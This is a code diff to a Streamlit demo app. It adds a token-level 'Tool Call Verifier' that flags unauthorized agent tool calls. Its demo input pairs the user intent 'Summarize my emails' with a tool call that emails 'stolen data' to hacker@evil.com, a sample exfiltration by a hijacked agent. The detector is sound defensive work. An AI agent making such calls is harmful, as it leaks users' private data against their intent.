@@ -100,9 +100,12 @@ MODELS = {
     "🔍 Tool Call Verifier": {
         "id": "llm-semantic-router/toolcall-verifier",
         "description": "Token-level verification of tool calls to detect unauthorized actions. Stage 2 defense for tool-calling agents.",
-        "type": "token_simple",
+        "type": "toolcall_verifier",
         "labels": None,
-        "demo": '{"action": "send_email", "to": "attacker@evil.com", "subject": "Exfiltrated data"}',
+        "demo": {
+            "user_intent": "Summarize my emails",
+            "tool_call": '{"name": "send_email", "arguments": {"to": "hacker@evil.com", "body": "stolen data"}}',
+        },
     },
 }
 
@@ -239,6 +242,38 @@ def classify_tokens_simple(text: str, model_id: str) -> list:
     return entities
 
 
+def classify_toolcall_verifier(
+    user_intent: str, tool_call: str, model_id: str
+) -> tuple:
+    """Classify tool call verification with special format."""
+    tokenizer, model = load_model(model_id, "token")
+    id2label = model.config.id2label
+
+    # Format input as per model requirements
+    input_text = f"[USER] {user_intent} [TOOL] {tool_call}"
+
+    inputs = tokenizer(
+        input_text, return_tensors="pt", truncation=True, max_length=2048
+    )
+
+    with torch.no_grad():
+        outputs = model(**inputs)
+        predictions = torch.argmax(outputs.logits, dim=-1)[0].tolist()
+
+    # Get tokens and labels
+    tokens = tokenizer.convert_ids_to_tokens(inputs["input_ids"][0])
+    labels = [id2label[pred] for pred in predictions]
+
+    # Find unauthorized tokens
+    unauthorized_tokens = [
+        (tokens[i], labels[i])
+        for i in range(len(tokens))
+        if labels[i] == "UNAUTHORIZED"
+    ]
+
+    return input_text, tokens, labels, unauthorized_tokens
+
+
 def create_highlighted_html(text: str, entities: list) -> str:
     """Create HTML with highlighted entities."""
     if not entities:
@@ -335,7 +370,22 @@ def main():
             value=demo["followup"],
             placeholder="Enter the user's follow-up message...",
         )
-        text_input = None  # Not used for dialogue models
+        text_input = user_intent_input = tool_call_input = None
+    elif model_config["type"] == "toolcall_verifier":
+        # Tool call verifier needs user intent and tool call
+        demo = model_config["demo"]
+        user_intent_input = st.text_input(
+            "👤 User Intent:",
+            value=demo["user_intent"],
+            placeholder="Enter the user's original intent...",
+        )
+        tool_call_input = st.text_area(
+            "🔧 Tool Call JSON:",
+            value=demo["tool_call"],
+            height=120,
+            placeholder="Enter the tool call JSON to verify...",
+        )
+        text_input = query_input = response_input = followup_input = None
     else:
         # Standard text input for other models
         text_input = st.text_area(
@@ -344,7 +394,9 @@ def main():
             height=120,
             placeholder="Type your text here...",
         )
-        query_input = response_input = followup_input = None
+        query_input = response_input = followup_input = user_intent_input = (
+            tool_call_input
+        ) = None
 
     st.markdown("---")
 
@@ -377,6 +429,25 @@ def main():
                             "response": response_input,
                             "followup": followup_input,
                         },
+                    }
+        elif model_config["type"] == "toolcall_verifier":
+            if not user_intent_input.strip() or not tool_call_input.strip():
+                st.warning("Please fill in both user intent and tool call fields.")
+            else:
+                with st.spinner("Analyzing..."):
+                    input_text, tokens, labels, unauthorized = (
+                        classify_toolcall_verifier(
+                            user_intent_input, tool_call_input, model_config["id"]
+                        )
+                    )
+                    st.session_state.result = {
+                        "type": "toolcall_verifier",
+                        "input_text": input_text,
+                        "tokens": tokens,
+                        "labels": labels,
+                        "unauthorized": unauthorized,
+                        "user_intent": user_intent_input,
+                        "tool_call": tool_call_input,
                     }
         elif not text_input.strip():
             st.warning("Please enter some text to analyze.")
@@ -454,6 +525,35 @@ def main():
             components.html(
                 create_highlighted_html_simple(result["text"], entities), height=150
             )
+        elif result["type"] == "toolcall_verifier":
+            unauthorized = result["unauthorized"]
+
+            if unauthorized:
+                st.error(f"⚠️ BLOCKED: Unauthorized tool call detected!")
+                st.markdown(f"**Flagged tokens:** {[t for t, _ in unauthorized[:10]]}")
+                st.markdown(f"**Total unauthorized tokens:** {len(unauthorized)}")
+            else:
+                st.success("✅ Tool call authorized")
+
+            st.markdown("### Input Format")
+            st.code(result["input_text"], language="text")
+
+            st.markdown("### Token-Level Classification")
+            # Create a simple table view
+            token_label_pairs = list(zip(result["tokens"], result["labels"]))
+            # Show first 50 tokens to avoid overwhelming the UI
+            display_tokens = token_label_pairs[:50]
+
+            for i in range(0, len(display_tokens), 5):
+                cols = st.columns(5)
+                for j, col in enumerate(cols):
+                    if i + j < len(display_tokens):
+                        token, label = display_tokens[i + j]
+                        color = "🔴" if label == "UNAUTHORIZED" else "🟢"
+                        col.markdown(f"{color} `{token}`")
+
+            if len(token_label_pairs) > 50:
+                st.info(f"Showing first 50 of {len(token_label_pairs)} tokens")
 
         # Raw Prediction Data expander
         with st.expander("🔬 Raw Prediction Data"):
